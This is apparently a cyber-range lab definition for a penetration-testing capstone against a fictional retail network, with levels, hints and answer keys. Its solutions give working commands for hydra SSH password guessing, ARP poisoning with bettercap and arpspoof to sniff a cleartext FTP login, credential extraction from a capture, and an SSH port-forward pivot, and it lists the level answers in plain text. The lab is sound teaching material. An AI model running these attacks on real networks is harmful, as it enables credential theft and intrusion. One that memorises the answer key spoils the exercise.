@@ -1,0 +1,394 @@
+{
+  "title": "CR-18 / Module 7 / N7a — Capstone: Full Network Penetration Test",
+  "description": "A full engagement against a small retail estate, chaining one technique from each earlier module: discovery and service fingerprinting, credential recovery from a handed-over capture, an anonymous file share, a password attack, ARP poisoning to read a cleartext service login, and an SSH port forward to reach a host that refuses the assessment machine. No exploits - every finding is a configuration decision.",
+  "prerequisites": [
+    "Modules 1 to 6 of CR-18",
+    "Comfort using a Linux shell and reading a packet capture in Wireshark",
+    "Familiarity with nmap, hydra, an FTP client, and SSH port forwarding"
+  ],
+  "outcomes": [
+    "Build an asset inventory of an unfamiliar network from a standing start",
+    "Recover credentials from traffic a client supplies as background material",
+    "Explain why rotating a credential without securing its transport changes nothing",
+    "Harvest usernames from a leaked directory and turn them into a working login",
+    "Read a cleartext service credential off the wire by getting on-path",
+    "Pivot through a compromised host to reach a service that filters by source address",
+    "Gather the evidence a penetration test report needs while the access is still live"
+  ],
+  "state": "UNRELEASED",
+  "estimated_duration": 150,
+  "variant_sandboxes": true,
+  "levels": [
+    {
+      "title": "Introduction level",
+      "level_type": "INFO_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "Welcome to the Module 7 capstone.\n\nOrion Retail Ltd is the company whose breach you reviewed in Module 6. They have engaged you for a follow-up assessment: the board signed off a remediation programme after that incident and wants independent confirmation that it landed.\n\n**Scope.** The office network, `192.168.60.0/24`. Everything in that range is in scope. There is no out-of-hours restriction and no change freeze; you have one window to work in.\n\n**What you have.** Your assessment machine is on the same network as the estate. It carries the recon, capture-analysis and password-attack tooling from the earlier modules - `nmap`, `hydra`, `ftp`, `curl`, `tcpdump`, `wireshark`, `bettercap` and `dsniff` - plus a candidate password list in your home directory. Orion's SOC has also handed you one packet capture from the pre-engagement window; it is in `~/case/`.\n\n**What the client believes.** That credentials were rotated, that the estate is segmented, and that the internal application server cannot be reached from a user workstation.\n\n**What you are being asked to find out.** Whether any of that is true. Each level below is one finding, and every one of them is a configuration problem rather than a software vulnerability - you will not need an exploit anywhere in this lab. Keep notes as you go: the assignment that follows this lab is the report, and it is easier to write while the evidence is still in front of you.\n\nAll answers are case-sensitive."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 2,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "In the topology panel on the right, right-click **vma** and select **Open GUI In New Window**. Log in with username **user** and password **Password123**.\n\nYou will want more than one shell before the end of this lab - the last two stages have you running a capture and a tunnel at the same time. The desktop gives you that; `tmux` is installed if you would rather work in one window.\n\nThe capture the SOC handed over is in `~/case/` and is read-only. The `case` shell alias takes you there.\n\nWhen you are in, submit **start** to unlock the next level.",
+      "local_content": "This sandbox has not been validated for local-only deployment."
+    },
+    {
+      "title": "Map the estate",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": 4,
+      "answer": null,
+      "answer_variable_name": "ftp_asset_tag",
+      "content": "Nobody has given you an asset inventory. Build one.\n\nSweep the scope, work out which hosts are live and what each of them is running, and read what the services volunteer about themselves. One host answers on a port that the rest of this lab depends on; another is up but will not talk to you at all, which is worth writing down now and coming back to at the end.\n\nThe file server's FTP service announces an asset tag in its greeting. Submit that tag.",
+      "solution": "* Sweep the scope and see who answers - `nmap -sn 192.168.60.0/24`. Five hosts plus the gateway.\n* Fingerprint what they run - `nmap -sV 192.168.60.0/24`. The useful findings:\n\n```\n192.168.60.20   80/tcp    http     nginx\n192.168.60.30   21/tcp    ftp      vsftpd\n                 22/tcp    ssh      OpenSSH\n192.168.60.40   22/tcp    ssh      OpenSSH\n192.168.60.50   8080/tcp  filtered\n```\n\n* `192.168.60.50` is up and its one interesting port is *filtered*, not closed - something is refusing you rather than nothing listening. That is the final objective, and you will come back to it in the last level.\n* The asset tag is in the FTP greeting. `-sV` on its own will not show it - nmap matches the service against its own fingerprint database and prints that instead (`vsftpd 2.0.8 or later`). The NSE banner script prints what the service actually said on connect:\n\n```\nnmap -sV --script banner -p21 192.168.60.30\n```\n\n```\n21/tcp open  ftp     vsftpd 2.0.8 or later\n|_banner: 220 Orion Retail file services - Asset Tag: ...\n```\n\nAsset tag: ${ANSWER}",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Getting the banner rather than just the port",
+          "content": "A plain port scan tells you 21 is open and nothing else, and -sV gives you nmap's guess at the product rather than what the service said. The greeting itself is what the NSE banner script prints: `--script banner`.",
+          "hint_penalty": 8,
+          "order": 0
+        },
+        {
+          "title": "If you would rather not use nmap for it",
+          "content": "The greeting is the first thing the server sends, so anything that opens the connection will show it: `ftp 192.168.60.30` prints it before the login prompt, and so does `nc 192.168.60.30 21`.",
+          "hint_penalty": 12,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 60,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0007.T1046"
+        },
+        {
+          "technique_key": "TA0007.T1018"
+        },
+        {
+          "technique_key": "TA0043.T1595"
+        }
+      ],
+      "expected_commands": [
+        "nmap"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "Read the handover capture",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": 4,
+      "answer": "Or10n_Rem3d1at3d!",
+      "answer_variable_name": null,
+      "content": "Orion's SOC captured `~/case/orion-handover.pcapng` on the office segment shortly before you arrived. They passed it over as background rather than as evidence of anything, and nobody on their side has looked at it closely.\n\nIt holds one short HTTP session: somebody in operations signing in to the panel you found on port 80. The remediation programme did rotate that credential. It did not change how it travels.\n\nRecover the password and submit it.",
+      "solution": "* Open it - `wireshark ~/case/orion-handover.pcapng &`, or work at the command line.\n* The whole session is one TCP stream. Right-click any packet and choose **Follow -> HTTP Stream** and you can read the exchange in order: a `GET /admin/`, a `401 Unauthorized` with `WWW-Authenticate: Basic realm=\"Orion Operations\"`, then the same request again carrying an `Authorization: Basic` header.\n* Basic authentication is base64, not encryption. Wireshark decodes it for you - expand **Hypertext Transfer Protocol -> Authorization** in the packet detail and it shows `Credentials: webops:...` underneath the encoded value.\n* The same field at the command line:\n\n```\ntshark -r ~/case/orion-handover.pcapng -Y http.authorization -T fields -e http.authbasic\n```\n\n* Or decode it yourself, which is worth doing once so the point lands:\n\n```\ntshark -r ~/case/orion-handover.pcapng -Y http.authorization -T fields -e http.authorization | cut -d' ' -f2 | base64 -d\n```\n\nThe account is `webops`.\n\n**Answer: `Or10n_Rem3d1at3d!`**",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where in the session to look",
+          "content": "It is one TCP stream, so read it as a conversation rather than as packets - Follow -> HTTP Stream. The first request is refused and the second one carries what you are after.",
+          "hint_penalty": 8,
+          "order": 0
+        },
+        {
+          "title": "Basic auth is not encryption",
+          "content": "HTTP Basic base64-encodes `user:password` and sends it in a header. Filter on `http.authorization`; Wireshark exposes the decoded form as `http.authbasic`, or pipe the encoded blob to `base64 -d`.",
+          "hint_penalty": 12,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 60,
+      "variant_answers": false,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0006.T1040"
+        },
+        {
+          "technique_key": "TA0006.T1552"
+        },
+        {
+          "technique_key": "TA0009.T1039"
+        }
+      ],
+      "expected_commands": [
+        "wireshark",
+        "tshark"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "Walk in the front door",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 3,
+      "answer": null,
+      "answer_variable_name": "panel_flag",
+      "content": "You have a working credential for the operations panel, recovered from traffic the client handed you themselves.\n\nUse it. The panel is on `192.168.60.20`, under `/admin/`.\n\nIt reports a deployment token. Submit that token.\n\nRead the rest of the page before you move on - it describes a scheduled job, and both of the next two levels start from what it tells you.",
+      "solution": "* The panel refuses an anonymous request:\n\n```\ncurl -i http://192.168.60.20/admin/\n```\n`401 Unauthorized`, with the Basic challenge.\n\n* Supply the recovered credential:\n\n```\ncurl -u 'webops:Or10n_Rem3d1at3d!' http://192.168.60.20/admin/\n```\n\nor open `http://192.168.60.20/admin/` in the browser and let it prompt you.\n\n* The page names the nightly transfer - `ws01` to `fs01`, over FTP, as `svc_sync` - and mentions that the handover documentation sits on the `fs01` anonymous drop. Those are your next two starting points.\n\n* The finding is not that you guessed a password. It is that a credential the client rotated after an incident is still recoverable by anyone on the network, because the panel was never moved to HTTPS. Rotation without transport security buys nothing.\n\nDeployment token: ${ANSWER}",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Sending the credential",
+          "content": "Basic auth over the command line is `curl -u user:password <url>`. In a browser, just request the page and answer the prompt.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Getting the exact account name",
+          "content": "The username is in the same decoded string as the password, before the colon: `webops`.",
+          "hint_penalty": 12,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 60,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0001.T1078"
+        },
+        {
+          "technique_key": "TA0006.T1552"
+        },
+        {
+          "technique_key": "TA0007.T1083"
+        }
+      ],
+      "expected_commands": [
+        "curl"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "What the file server gives away",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 15,
+      "minimal_possible_solve_time": 4,
+      "answer": null,
+      "answer_variable_name": "handover_ref",
+      "content": "The panel pointed at a documentation drop on the file server. It is on FTP, and it does not ask who you are.\n\nRetrieve what is there and read it properly - it is the most useful thing you will find in this engagement. One of the documents carries a change reference at the top.\n\nSubmit that change reference.",
+      "solution": "* Log in with no credential at all:\n\n```\nftp 192.168.60.30\n```\nUsername `anonymous`, empty password - or `ftp -n` and `user anonymous x`.\n\n* `ls` shows two files. Take both:\n\n```\nget it-handover.txt\nget staff-directory.csv\nbye\n```\n\n* `it-handover.txt` is the outgoing administrator's handover note. It gives you three things: the account naming convention (`first-initial.surname`, lower case), the fact that the post-incident password reset was not completed on one account, and that the account in question is in the support team and is still on a single dictionary word. `staff-directory.csv` turns that into a list of real usernames, and tells you which two are in Support.\n\n* The finding is the drop itself. An unauthenticated file service was left enabled because nobody could say who depended on it, and it is publishing an internal staff directory and a document describing exactly which account is weak.\n\nChange reference: ${ANSWER}",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Logging in without a credential",
+          "content": "Anonymous FTP takes the literal username `anonymous` and ignores the password. If your client is fussy, `ftp -n 192.168.60.30` then `user anonymous x` at the prompt.",
+          "hint_penalty": 8,
+          "order": 0
+        },
+        {
+          "title": "Where the reference is",
+          "content": "It is on the second line of the handover note, labelled as a change reference. Submit just the reference itself, not the label.",
+          "hint_penalty": 12,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 60,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0007.T1083"
+        },
+        {
+          "technique_key": "TA0007.T1087"
+        },
+        {
+          "technique_key": "TA0001.T1199"
+        },
+        {
+          "technique_key": "TA0009.T1039"
+        }
+      ],
+      "expected_commands": [
+        "ftp"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "One password that was never rotated",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": 6,
+      "answer": null,
+      "answer_variable_name": "ssh_flag",
+      "content": "You know the naming convention, you have the staff list, and you know that one support account is still on a single dictionary word.\n\nTurn that into a login on the file server. There is a candidate list in your home directory, `wordlist.txt`, of the right shape for what the handover note describes - you still have to build the username side yourself.\n\nThe account's home directory holds a flag. Submit it.\n\nNote as you go which accounts respond to the attack and which do not; it is part of the finding.",
+      "solution": "* Build the username list from the directory. The convention is first-initial-dot-surname, lower case:\n\n```\ncut -d, -f4 staff-directory.csv | tail -n +2 > users.txt\n```\n\n* Attack SSH on the file server with the candidate list:\n\n```\nhydra -L users.txt -P wordlist.txt -t 4 ssh://192.168.60.30\n```\n\nIt returns exactly one pair - `j.mercer` / `sunflower`. The other four accounts never respond, because their passwords were rotated to something that is not in any wordlist.\n\n* Log in and take the flag:\n\n```\nssh j.mercer@192.168.60.30\ncat ~/flag.txt\n```\n\n* Two findings here, not one. The obvious one is the unrotated single-word password. The quieter one is that nothing rate-limited or locked out an attack that tried every word in a list against five accounts - no fail2ban, no lockout policy, and nothing in any log that anybody reads.\n\nFlag: ${ANSWER}",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Building the username list",
+          "content": "The usernames are already a column in staff-directory.csv - you do not have to derive them from the full names. Cut the fourth field and drop the header row.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "The attack itself",
+          "content": "hydra takes a username list with -L and a password list with -P, and the target as a URL: `hydra -L users.txt -P wordlist.txt ssh://192.168.60.30`. Keep the thread count modest (-t 4); it finishes in seconds either way.",
+          "hint_penalty": 18,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 80,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0006.T1110.001"
+        },
+        {
+          "technique_key": "TA0001.T1078"
+        },
+        {
+          "technique_key": "TA0007.T1087"
+        }
+      ],
+      "expected_commands": [
+        "hydra",
+        "ssh"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "Listen to the nightly transfer",
+      "level_type": "TRAINING_LEVEL",
+      "order": 8,
+      "estimated_duration": 35,
+      "minimal_possible_solve_time": 10,
+      "answer": null,
+      "answer_variable_name": "sync_password",
+      "content": "You have a shell on the file server. Look at what arrives on it on a schedule - the landing directory for the transfer job has operational notes in it, and the FTP log records every time the job runs.\n\nThe job authenticates as a service account. That account's password is not written down anywhere you can reach: not on the file server, not on the workstation in any file you can read, and not in the ticket system. It exists in readable form in exactly one place - on the wire, once a minute, because the job still uses FTP.\n\nGet yourself into a position to read it, and submit the password.",
+      "solution": "* Find the schedule from the foothold:\n\n```\ncat /srv/sync/sync-notes.txt\ngrep svc_sync /var/log/vsftpd.log | tail\n```\n\nThe notes name `svc_sync` and say the credential is held on `ws01` and deliberately not copied to the file server. The log shows the login landing roughly once a minute from `192.168.60.40`.\n\n* You cannot read it off either host - it is a hashed system password on both ends. So put yourself between them. From your assessment machine, poison both ARP caches so the two hosts send their traffic to you:\n\n```\nsudo sysctl -w net.ipv4.ip_forward=1\nsudo bettercap -iface eth0 -eval \"set arp.spoof.targets 192.168.60.40,192.168.60.30; arp.spoof on; net.sniff on\"\n```\n\n`arpspoof` does the same job if you prefer it - one instance per direction:\n\n```\nsudo arpspoof -i eth0 -t 192.168.60.40 192.168.60.30\nsudo arpspoof -i eth0 -t 192.168.60.30 192.168.60.40\n```\n\n* Capture the control channel and wait for the next run:\n\n```\nsudo tcpdump -i eth0 -A -s0 'tcp port 21 and host 192.168.60.40'\n```\n\nWithin a minute you will see the login in plain text:\n\n```\nUSER svc_sync\nPASS <the password>\n```\n\n* Stop spoofing when you are done so the caches recover.\n\n* Three findings stack up here: a service account authenticating over a cleartext protocol, no switch-level protection against ARP poisoning (the handover note admits there is no dynamic ARP inspection and no 802.1X), and a migration ticket that has been open for two years.\n\nPassword: ${ANSWER}",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where the schedule is documented",
+          "content": "Two places, both readable from your foothold: the notes file in the transfer landing directory under /srv, and the vsftpd log in /var/log. Between them you get the account name and how often it logs in.",
+          "hint_penalty": 8,
+          "order": 0
+        },
+        {
+          "title": "Why you cannot just read the password",
+          "content": "It is a system account password on both hosts, so it is stored hashed. The job script on the workstation holds the plaintext but is root-only, and you are not root there - you have no access to that host at all yet. The protocol is the weakness, not the file permissions.",
+          "hint_penalty": 12,
+          "order": 1
+        },
+        {
+          "title": "Getting on-path",
+          "content": "This is the Module 3 technique. Enable IP forwarding first or you will black-hole the traffic you are trying to read, then poison both directions - the workstation's entry for the server and the server's entry for the workstation - and sniff TCP port 21.",
+          "hint_penalty": 14,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 90,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0006.T1557.002"
+        },
+        {
+          "technique_key": "TA0006.T1040"
+        },
+        {
+          "technique_key": "TA0009.T1039"
+        },
+        {
+          "technique_key": "TA0007.T1040"
+        }
+      ],
+      "expected_commands": [
+        "bettercap",
+        "arpspoof",
+        "tcpdump"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "The host that will not talk to you",
+      "level_type": "TRAINING_LEVEL",
+      "order": 9,
+      "estimated_duration": 35,
+      "minimal_possible_solve_time": 10,
+      "answer": null,
+      "answer_variable_name": "final_flag",
+      "content": "Back to the host you noted in the first level - the one that is up but whose service is filtered from your machine.\n\nIt is the internal application server, and the client's position is that a user workstation cannot reach it. That is half true: it will not talk to *you*. It is perfectly happy to talk to the workstation.\n\nYou now hold a credential that works somewhere new. Use it, borrow the workstation's position on the network, and read the service.\n\nSubmit the reconciliation token it returns.",
+      "solution": "* The service account password is reused for an interactive login on the workstation. That is the reuse finding:\n\n```\nssh svc_sync@192.168.60.40\n```\n\n* Confirm the asymmetry. From the workstation the service answers:\n\n```\ncurl http://192.168.60.50:8080/\n```\n\nFrom your own machine it does not - the connection is dropped, which is why nmap called it filtered rather than closed.\n\n* You do not need a shell on the application server, and there is no account there to get one with. You only need your traffic to arrive from an address it trusts. Forward a local port through the workstation:\n\n```\nssh -fN -L 8080:192.168.60.50:8080 svc_sync@192.168.60.40\ncurl http://localhost:8080/\n```\n\nThe request leaves the workstation from the workstation's own address, so the firewall permits it, and the response comes back down your tunnel.\n\n* Tear the tunnel down when you are finished - `pkill -f 8080:192.168.60.50`.\n\n* The finding is the trust model. The service has no authentication of any kind; the only control is a host firewall rule that treats \"arrived from the right IP\" as though it meant \"is the right caller\". One reused password anywhere on the office network is enough to satisfy it.\n\nReconciliation token: ${ANSWER}",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where the credential works",
+          "content": "You captured it authenticating an FTP job, but check whether it is only an FTP credential. The same password is often reused for the interactive account the job runs as - try it against SSH on the workstation the job runs from.",
+          "hint_penalty": 12,
+          "order": 0
+        },
+        {
+          "title": "Borrowing the workstation's position",
+          "content": "You do not need to run anything on the application server. An SSH local port forward makes a port on your machine come out of the workstation: `ssh -fN -L <localport>:<target>:<targetport> user@pivot`, then talk to localhost.",
+          "hint_penalty": 18,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 90,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {
+          "technique_key": "TA0008.T1021.004"
+        },
+        {
+          "technique_key": "TA0011.T1090"
+        },
+        {
+          "technique_key": "TA0011.T1572"
+        },
+        {
+          "technique_key": "TA0001.T1078"
+        },
+        {
+          "technique_key": "TA0010.T1041"
+        }
+      ],
+      "expected_commands": [
+        "ssh",
+        "curl"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "Lab Completed",
+      "level_type": "INFO_LEVEL",
+      "order": 10,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "That is the engagement.\n\nSeven findings, and not one of them needed an exploit:\n\n* an administrative panel on plain HTTP, so a rotated credential is still recoverable by anyone on the segment\n* a credential rotation that was signed off without the transport work that would have made it meaningful\n* an unauthenticated file service publishing a staff directory and a document naming the weakest account\n* one account left on a single dictionary word, with nothing rate-limiting the attack that found it\n* a service account authenticating over cleartext FTP once a minute\n* no link-layer protection, so anyone on the office network can read that traffic\n* an internal service with no authentication at all, relying on a source address it cannot verify\n\nEach one is a decision somebody made, or deferred. That is what makes them reportable, and it is what the assignment asks you to write up.\n\nTake your notes with you to N7b. You need the evidence, the affected hosts, and enough detail to score each finding - the report is the deliverable the client actually pays for."
+    }
+  ]
+}
